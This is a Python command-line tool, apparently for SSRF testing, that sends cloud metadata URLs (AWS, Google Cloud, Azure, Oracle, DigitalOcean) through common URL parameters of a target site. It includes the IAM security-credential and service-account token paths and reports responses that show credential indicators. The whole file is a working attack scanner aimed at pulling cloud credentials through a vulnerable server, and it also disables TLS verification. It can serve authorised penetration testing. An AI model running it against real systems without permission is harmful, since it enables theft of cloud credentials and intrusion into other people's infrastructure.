#!/usr/bin/env python3
"""
Cloud Metadata Endpoint Tester
Tests for SSRF vulnerabilities via cloud metadata endpoints
"""

import requests
import sys

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    END = '\033[0m'

class MetadataTester:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        
        # Metadata endpoints for all major providers
        self.metadata_endpoints = {
            'AWS EC2': {
                'base': 'http://169.254.169.254',
                'paths': [
                    '/latest/meta-data/',
                    '/latest/meta-data/hostname',
                    '/latest/meta-data/iam/security-credentials/',
                    '/latest/user-data/',
                    '/latest/dynamic/instance-identity/document'
                ]
            },
            'Google Cloud': {
                'base': 'http://metadata.google.internal',
                'paths': [
                    '/computeMetadata/v1/',
                    '/computeMetadata/v1/instance/',
                    '/computeMetadata/v1/instance/service-accounts/default/token'
                ],
                'headers': {'Metadata-Flavor': 'Google'}
            },
            'Azure': {
                'base': 'http://169.254.169.254',
                'paths': [
                    '/metadata/instance?api-version=2021-02-01',
                    '/metadata/instance/compute?api-version=2021-02-01'
                ],
                'headers': {'Metadata': 'true'}
            },
            'Oracle Cloud': {
                'base': 'http://169.254.169.254',
                'paths': [
                    '/opc/v1/instance/',
                    '/opc/v1/instance/metadata/'
                ]
            },
            'DigitalOcean': {
                'base': 'http://169.254.169.254',
                'paths': [
                    '/metadata/v1/',
                    '/metadata/v1/id',
                    '/metadata/v1/hostname'
                ]
            }
        }
    
    def test_ssrf_parameter(self, param_name):
        """Test if parameter is vulnerable to SSRF"""
        print(f"{Colors.CYAN}[*] Testing parameter: {param_name}{Colors.END}\n")
        
        for provider, config in self.metadata_endpoints.items():
            print(f"{Colors.YELLOW}{provider}:{Colors.END}")
            
            for path in config['paths']:
                test_url = config['base'] + path
                
                # Build request
                params = {param_name: test_url}
                headers = config.get('headers', {})
                
                try:
                    response = self.session.get(
                        self.target,
                        params=params,
                        headers=headers,
                        timeout=10,
                        verify=False
                    )
                    
                    # Check for metadata in response
                    indicators = [
                        'ami-id', 'instance-id', 'account-id',
                        'private-ip', 'public-ipv4',
                        'metadata', 'token', 'credentials'
                    ]
                    
                    found_indicators = [i for i in indicators if i in response.text.lower()]
                    
                    if found_indicators:
                        print(f"{Colors.RED}[!] VULNERABLE: {path}{Colors.END}")
                        print(f"    Indicators: {', '.join(found_indicators)}")
                        print(f"    Response length: {len(response.text)}")
                    else:
                        print(f"{Colors.GREEN}[✓] No metadata: {path}{Colors.END}")
                
                except Exception as e:
                    print(f"{Colors.YELLOW}[?] Error: {path}{Colors.END}")
            
            print()
    
    def test_url_parameter(self):
        """Test common URL parameters"""
        params_to_test = ['url', 'uri', 'path', 'file', 'page', 'redirect', 'next']
        
        print(f"{Colors.CYAN}{'='*60}{Colors.END}")
        print(f"{Colors.CYAN}SSRF METADATA ENDPOINT TESTING{Colors.END}")
        print(f"{Colors.CYAN}{'='*60}{Colors.END}\n")
        
        print(f"Target: {self.target}\n")
        
        for param in params_to_test:
            self.test_ssrf_parameter(param)

def main():
    if len(sys.argv) < 2:
        print(f"{Colors.YELLOW}Usage: python cloud_metadata_tester.py <target_url>{Colors.END}")
        print(f"\nExample: python cloud_metadata_tester.py https://example.com/api/fetch")
        sys.exit(1)
    
    target = sys.argv[1]
    tester = MetadataTester(target)
    tester.test_url_parameter()

if __name__ == "__main__":
    main()
